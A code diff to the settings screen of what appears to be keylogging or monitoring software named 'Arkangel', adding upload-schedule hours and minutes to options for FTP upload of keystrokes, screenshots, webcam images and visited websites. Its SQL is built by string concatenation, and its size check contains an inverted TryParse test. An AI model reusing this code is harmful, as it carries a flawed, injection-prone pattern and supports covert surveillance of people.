@@ -31,7 +31,7 @@ namespace Arkangel
                 connect.Open();
                 using (SQLiteCommand fmd = connect.CreateCommand())
                 {
-                    SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"SELECT enable,time,upKeystroke,upScrshot,upWebcam,upWebsite,upSize,size,clear FROM FTP,current_user WHERE FTP.id = current_user.id", connect);
+                    SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"SELECT * FROM FTP,current_user WHERE FTP.id = current_user.id", connect);
                     SQLiteDataReader data = sqlComm_Alert.ExecuteReader();
                     while (data.Read())
                     {
@@ -42,6 +42,8 @@ namespace Arkangel
                         if (data["upWebsite"].ToString() == "1") cb_upWebsite.IsChecked = true; else cb_upWebsite.IsChecked = false;
                         if (data["upSize"].ToString() == "1") cb_limitedSize.IsChecked = true; else cb_limitedSize.IsChecked = false;
                         tb_kbs.Text = data["size"].ToString();
+                        tb_hours.Text = data["hours"].ToString();
+                        tb_minutes.Text = data["minutes"].ToString();
                     }
                 }
             }
@@ -88,7 +90,7 @@ namespace Arkangel
                 int limitSize = 0;
                 int hout = 0;
                 int minutes = 0;
-                if ((enable==1&&(!Int32.TryParse(tb_hours.Text, out hout) || !Int32.TryParse(tb_minutes.Text, out minutes) || (minutes < 0) || (hout < 0) || (minutes == 0 && hout == 0)))||((upSize==1)&&((int.TryParse(tb_kbs.Text,out limitSize)|| (limitSize <= 0) ))))
+                if ((enable == 1 && (!Int32.TryParse(tb_hours.Text, out hout) || !Int32.TryParse(tb_minutes.Text, out minutes) || (minutes < 0) || (hout < 0) || (minutes == 0 && hout == 0))) || ((upSize == 1) && ((int.TryParse(tb_kbs.Text, out limitSize) || (limitSize <= 0)))))
                 {
                     MessageBox.Show("Limit Size, Hour, Minute should be a number", "Fail");
                 }
@@ -99,7 +101,7 @@ namespace Arkangel
                         connect.Open();
                         using (SQLiteCommand fmd = connect.CreateCommand())
                         {
-                            SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"UPDATE FTP SET enable=" + enable + ",upKeystroke=" + upKeyStroke + ",upScrshot=" + upScrshot + ",upWebcam=" + upWebcam + ",upWebsite=" + upWebsite+",upSize= "+ upSize+",size=" + limitSize + ",clear=" + clear + " WHERE FTP.id = (SELECT current_user.id FROM current_user)", connect);
+                            SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"UPDATE FTP SET enable=" + enable +",hours=" +hout +",minutes="+minutes+",upKeystroke=" + upKeyStroke + ",upScrshot=" + upScrshot + ",upWebcam=" + upWebcam + ",upWebsite=" + upWebsite+",upSize= "+ upSize+",size=" + limitSize + ",clear=" + clear + " WHERE FTP.id = (SELECT current_user.id FROM current_user)", connect);
                             sqlComm_Alert.ExecuteNonQuery();
                         }
                     }
